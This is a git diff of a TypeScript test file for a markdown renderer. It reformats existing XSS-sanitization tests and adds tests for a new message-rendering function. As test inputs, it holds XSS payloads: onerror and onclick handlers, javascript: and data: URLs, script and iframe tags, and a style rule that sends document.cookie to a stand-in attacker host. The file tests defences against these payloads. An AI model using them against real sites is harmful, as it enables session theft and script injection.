@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test";
-import { renderMarkdown, locateQuote } from "./render";
+import { renderMarkdown, renderMessageMarkdown, locateQuote } from "./render";
 
 describe("renderMarkdown", () => {
   test("renders headings", () => {
@@ -34,7 +34,9 @@ describe("renderMarkdown", () => {
 
   test("preserves the language-X class and data-language attr for fenced code", () => {
     const html = renderMarkdown("```js\nconst a = 1;\n```\n");
-    expect(html).toContain('<pre data-language="js"><code class="language-js">');
+    expect(html).toContain(
+      '<pre data-language="js"><code class="language-js">',
+    );
   });
 });
 
@@ -50,7 +52,9 @@ describe("renderMarkdown — XSS sanitization", () => {
   });
 
   test("strips event-handler attributes on inline elements (e.g. <img onerror>)", () => {
-    const html = renderMarkdown('![alt](https://example.com/x.png)\n\n<img src="x" onerror="alert(1)">\n');
+    const html = renderMarkdown(
+      '![alt](https://example.com/x.png)\n\n<img src="x" onerror="alert(1)">\n',
+    );
     // The ![] form yields a clean <img> with allowed attrs.
     expect(html).toContain("<img");
     // Neither the inline nor the markdown-derived img should retain onerror.
@@ -65,19 +69,25 @@ describe("renderMarkdown — XSS sanitization", () => {
   });
 
   test("strips data: URLs from markdown links (only http/https/mailto allowed)", () => {
-    const html = renderMarkdown("[click](data:text/html,<script>alert(1)</script>)\n");
+    const html = renderMarkdown(
+      "[click](data:text/html,<script>alert(1)</script>)\n",
+    );
     expect(html).not.toContain("data:");
     expect(html).not.toContain("<script");
   });
 
   test("strips <iframe> tags", () => {
-    const html = renderMarkdown("hello\n\n<iframe src=\"https://evil.example\"></iframe>\n");
+    const html = renderMarkdown(
+      'hello\n\n<iframe src="https://evil.example"></iframe>\n',
+    );
     expect(html).not.toContain("<iframe");
     expect(html).not.toContain("evil.example");
   });
 
   test("strips <style> tags (CSS-based exfiltration vector)", () => {
-    const html = renderMarkdown("hello\n\n<style>body { background: url('https://evil.example/'+document.cookie) }</style>\n");
+    const html = renderMarkdown(
+      "hello\n\n<style>body { background: url('https://evil.example/'+document.cookie) }</style>\n",
+    );
     expect(html).not.toContain("<style");
     expect(html).not.toContain("evil.example");
   });
@@ -91,7 +101,9 @@ describe("renderMarkdown — XSS sanitization", () => {
   });
 
   test("strips inline event handlers on otherwise-allowed tags", () => {
-    const html = renderMarkdown('<a href="https://example.com" onclick="alert(1)">link</a>\n');
+    const html = renderMarkdown(
+      '<a href="https://example.com" onclick="alert(1)">link</a>\n',
+    );
     expect(html).toContain('href="https://example.com"');
     expect(html).not.toContain("onclick");
     expect(html).not.toContain("alert(1)");
@@ -101,6 +113,49 @@ describe("renderMarkdown — XSS sanitization", () => {
     const html = renderMarkdown('<p class="evil-class">hello</p>\n');
     expect(html).toContain("hello");
     expect(html).not.toContain("evil-class");
+  });
+});
+
+describe("renderMessageMarkdown", () => {
+  test("renders agent-style numbered list with bold labels", () => {
+    const msg = [
+      "Here are two directions:",
+      "",
+      "1. **Structure-forward:** keeps the original frame",
+      "2. **Season-forward:** leans on year-round wear",
+    ].join("\n");
+    const html = renderMessageMarkdown(msg);
+    expect(html).toContain("<ol>");
+    expect(html).toContain("<strong>Structure-forward:</strong>");
+    expect(html).toContain("<strong>Season-forward:</strong>");
+  });
+
+  test("renders inline code and fenced code blocks", () => {
+    const html = renderMessageMarkdown("Use `foo` like:\n\n```\nfoo()\n```");
+    expect(html).toContain("<code>foo</code>");
+    expect(html).toMatch(/<pre><code[^>]*>foo\(\)/);
+  });
+
+  test("preserves http/https links", () => {
+    const html = renderMessageMarkdown("see [docs](https://example.com)");
+    expect(html).toContain('href="https://example.com"');
+  });
+
+  test("strips javascript: URLs from inline links", () => {
+    const html = renderMessageMarkdown("click [here](javascript:alert(1))");
+    expect(html).not.toContain("javascript:");
+  });
+
+  test("strips raw <script> tags inside agent prose", () => {
+    const html = renderMessageMarkdown("ok <script>alert(1)</script> done");
+    expect(html).not.toContain("<script>");
+    expect(html).toContain("ok");
+    expect(html).toContain("done");
+  });
+
+  test("plain prose still produces a paragraph wrapper", () => {
+    const html = renderMessageMarkdown("Fair point.");
+    expect(html).toContain("<p>Fair point.</p>");
   });
 });
 
@@ -125,7 +180,9 @@ describe("locateQuote", () => {
   test("falls back to first occurrence when context-prefixed search fails", () => {
     const flat = "the cat sat. then the cat slept.";
     // Context that doesn't appear before the quote — fall back to first occurrence.
-    expect(locateQuote(flat, "cat", "stale context that doesnt match: ")).toBe(4);
+    expect(locateQuote(flat, "cat", "stale context that doesnt match: ")).toBe(
+      4,
+    );
   });
 
   test("treats empty contextBefore as 'no context provided'", () => {
